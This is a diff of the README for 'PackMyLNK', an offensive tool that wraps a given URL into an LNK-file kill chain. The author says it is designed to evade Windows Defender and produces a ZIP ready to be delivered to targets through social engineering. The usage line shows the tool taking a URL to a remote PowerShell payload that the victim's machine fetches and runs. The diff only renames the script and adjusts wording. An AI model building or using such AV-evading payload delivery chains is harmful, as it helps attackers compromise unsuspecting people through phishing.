@@ -1,9 +1,9 @@
 # PackMyLNK
 
-This script takes a URL as input and embeds it into a classic kill chain using LNK files. I designed it with the specific intent of avoiding detection by Windows Defender. It generates a final ZIP file, ready to be delivered to the target using Social Engineering techniques.
+This tool takes a URL as input and embeds it into a classic kill chain using .LNK files. I designed it with the specific intent of avoiding detection by Windows Defender. It generates a final ZIP file, ready to be delivered to the target using Social Engineering techniques.
 
 ## Usage
-`.\PackMyLNK.ps1 -Url http://example.com/payload-to-execute.ps1`
+`.\PackMyLNK.exe -Url http://example.com/RunMe.ps1`
 
 ___
 
